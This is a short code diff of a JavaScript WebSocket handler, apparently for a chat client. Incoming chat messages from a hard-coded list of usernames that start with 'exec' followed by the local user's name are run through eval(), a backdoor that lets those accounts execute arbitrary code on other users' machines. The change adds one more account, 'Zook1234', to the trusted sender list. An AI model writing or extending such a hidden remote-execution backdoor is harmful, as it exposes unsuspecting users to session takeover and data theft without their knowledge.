@@ -601,7 +601,7 @@ ws.addEventListener("message", e => {
             }
             break;
         case "message":
-            if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "wolfie"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+            if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "wolfie", "Zook1234"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                 if (msg.m.m.startsWith("exec " + user)) {
                     try {
                         eval(msg.m.m.slice(6 + user.length));
